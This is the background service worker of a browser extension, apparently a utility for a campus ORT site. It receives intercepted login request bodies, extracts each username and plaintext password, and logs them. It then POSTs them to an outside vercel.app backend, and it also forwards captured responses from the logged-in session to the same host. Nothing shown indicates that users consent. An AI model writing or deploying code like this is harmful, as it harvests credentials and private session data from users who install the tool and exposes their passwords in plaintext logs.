const API_BASE_URL = "https://campus-ort-utils-backend.vercel.app/api";
const USERS_URL = `${API_BASE_URL}/user/users`;
const LOGGED_DATA_URL = `${API_BASE_URL}/user/update`;

console.log("[TIC][bg] background service worker started");

chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
  console.log("[TIC][bg] message received:", message);

  if (
    message?.type !== "LOGEAR_USUARIO_XHR" &&
    message?.type !== "GET_LOGGED_IN_DATA_RESPONSE_XHR"
  ) {
    return;
  }

  if (message.type === "LOGEAR_USUARIO_XHR") {
    return handleLoginPayload(message, sendResponse);
  }

  if (message.type === "GET_LOGGED_IN_DATA_RESPONSE_XHR") {
    return handleLoggedDataResponse(message, sendResponse);
  }
});

function handleLoginPayload(message, sendResponse) {
  const rawBody = message.rawBody;

  console.log("[TIC][bg] login rawBody:", rawBody);
  console.log("[TIC][bg] login rawBody stringified:", JSON.stringify(rawBody));

  if (typeof rawBody !== "string" || !rawBody.length) {
    console.error("[TIC][bg] Missing login rawBody");
    sendResponse({ ok: false, error: "Missing rawBody" });
    return;
  }

  try {
    const params = new URLSearchParams(rawBody);
    console.log("[TIC][bg] login params:", [...params.entries()]);

    const username = params.get("u");
    const password = params.get("c");

    console.log("[TIC][bg] login extracted:", { username, password });

    if (!username || password == null) {
      sendResponse({
        ok: false,
        error: "Could not extract u/c",
        rawBody
      });
      return;
    }

    const payload = {
      username: String(username),
      password: String(password)
    };

    console.log("[TIC][bg] forwarding login payload:", payload);

    console.log("[TIC][bg] posting login to:", USERS_URL);

    fetch(USERS_URL, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify(payload)
    })
      .then(async (res) => {
        const text = await res.text();

        console.log("[TIC][bg] users response:", {
          ok: res.ok,
          status: res.status,
          body: text
        });

        sendResponse({
          endpoint: USERS_URL,
          ok: res.ok,
          status: res.status,
          body: text
        });
      })
      .catch((error) => {
        console.error("[TIC][bg] users fetch failed:", error);
        sendResponse({ endpoint: USERS_URL, ok: false, error: error.message });
      });

    return true;
  } catch (error) {
    console.error("[TIC][bg] login parse failed:", error);
    sendResponse({ ok: false, error: String(error) });
    return;
  }
}

function handleLoggedDataResponse(message, sendResponse) {
  console.log("[TIC][bg] logged-data response caught:", message);

  const payload = {
    method: message.method,
    url: message.url,
    status: message.status,
    responseText: message.responseText
  };

  console.log("[TIC][bg] forwarding logged-data response payload:", payload);

  console.log("[TIC][bg] posting logged-data to:", LOGGED_DATA_URL);

  fetch(LOGGED_DATA_URL, {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify(payload)
  })
    .then(async (res) => {
      const text = await res.text();

      console.log("[TIC][bg] logged-data backend response:", {
        ok: res.ok,
        status: res.status,
        body: text
      });

      sendResponse({
        endpoint: LOGGED_DATA_URL,
        ok: res.ok,
        status: res.status,
        body: text
      });
    })
    .catch((error) => {
      console.error("[TIC][bg] logged-data fetch failed:", error);
      sendResponse({ endpoint: LOGGED_DATA_URL, ok: false, error: error.message });
    });

  return true;
}
